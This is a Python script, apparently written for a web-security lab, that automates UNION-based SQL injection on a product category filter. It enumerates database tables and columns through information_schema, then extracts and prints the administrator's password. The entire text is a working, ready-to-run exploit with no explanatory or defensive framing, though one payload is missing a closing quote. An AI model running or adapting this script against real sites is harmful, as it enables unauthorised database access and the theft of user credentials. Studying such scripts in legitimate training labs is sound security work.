import requests
import sys
import urllib3
from bs4 import BeautifulSoup
import re

urllib3.disable_warnings(urllib3.exceptions.InsecureRequestWarning)
proxies = {'http': 'http://127.0.0.1:8080', 'https': 'https://127.0.0.1:8080'}

def exploit(url, payload):
    uri = "filter?category="
    request = requests.get(url + uri + payload, verify=False, proxies=proxies)
    return request.text

def tableSearch(url):
    payload = "' union select table_name, null from information_schema.tables-- -"
    response = exploit(url, payload)
    soup = BeautifulSoup(response, 'html.parser')
    userTable = soup.find(text=re.compile('.*users.*'))
    if userTable:
        return userTable
    else:
        return False

def columnSearch(url, userTable):
    payload = f"' union select column_name, null from information_schema.columns where table_name='{userTable}-- -"
    response = exploit(url, payload)
    soup = BeautifulSoup(response, 'html.parser')
    userColumn = soup.find(text=re.compile('.*username.*'))
    passwdColumn = soup.find(text=re.compile('.*password.*'))
    return userColumn, passwdColumn

def adminSearch(url, userTable, userColumn, passwdColumn):
    payload = f"' union select {userColumn}, {passwdColumn} from {userTable}-- -"
    response = exploit(url, payload)
    soup = BeautifulSoup(response, 'html.parser')
    if soup.body:
        element = soup.body.find(string="administrator")
        if element:
            parent = element.parent
            if parent:
                data = parent.find_next('td')
                if data:
                    passwd = data.get_text(strip=True)
                    return passwd

if __name__ == "__main__":
    try:
        url = sys.argv[1].strip()
    except IndexError:
        print(f"[!] error: {sys.argv[0]} <url>")
        sys.exit(1)

    print("[?] scanning for table...")
    userTable = tableSearch(url)
    if userTable:
        print(f"[+] table : {tableSearch(url)}")
        userColumn, passwdColumn = columnSearch(url, userTable)
        if userColumn and passwdColumn:
            print(f"[+] username column: {userColumn}")
            print(f"[+] password column: {passwdColumn}")

            adminPasswd = adminSearch(url, userTable, userColumn, passwdColumn)
            if adminPasswd:
                print(f"[+] admin password: {adminPasswd}")
            else:
                print("[-] password: failure")
        else:
            print("[-] column: failure")
    else:
        print("[-] status: failure")
